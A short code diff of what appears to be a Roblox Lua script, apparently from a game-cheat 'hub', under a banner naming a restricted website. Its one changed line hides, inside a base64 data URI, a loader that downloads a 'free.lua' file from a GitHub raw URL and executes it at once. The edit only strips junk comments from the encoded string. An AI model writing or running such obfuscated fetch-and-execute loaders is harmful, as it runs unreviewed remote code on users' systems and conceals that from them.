@@ -23,5 +23,4 @@
 -- ██  OFFICIAL WEBSITE: www.xenothor-secure.net                                ██
 -- ██  (Access restricted, authorized users only)                              ██
 -- ██████████████████████████████████████████████████████████████████████████
-
-loadstring(game:HttpGet('data:text/plain;base64,bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Zb3hhbkh1Yi9oeXBlcnNob3QvbWFpbi9mcmVlLmx1YSIpKSgpCi0tIHljdW5oajBzCgotLSBpa2RlNDhycQ=='))()
+loadstring(game:HttpGet('data:text/plain;base64,bG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Zb3hhbkh1Yi9oeXBlcnNob3QvbWFpbi9mcmVlLmx1YSIpKSgpCg=='))()
